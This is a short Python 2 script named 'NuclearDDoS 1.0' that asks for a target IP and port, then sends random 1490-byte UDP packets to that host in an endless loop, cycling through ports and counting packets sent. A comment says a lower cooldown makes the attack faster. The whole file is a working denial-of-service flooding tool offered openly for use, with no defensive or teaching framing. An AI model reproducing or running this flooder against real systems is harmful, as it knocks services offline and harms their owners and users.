print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet GMKR-Ddos")
print
print "NuclearDDoS 1.0"
print "NuclearDDoS is an Open Source DDoS tool."
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet NuclearDDoS")
print("NuclearDDoS")
print ("\033[92m")
print "    NuclearDDoS"
time.sleep(2)
sent = 0
cooldown = 0.01  # Adjust cooldown timer (lower value = faster attack)
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
    if port == 65534:
        port = 1
    time.sleep(cooldown)  # Adjust the time delay to control the attack speed
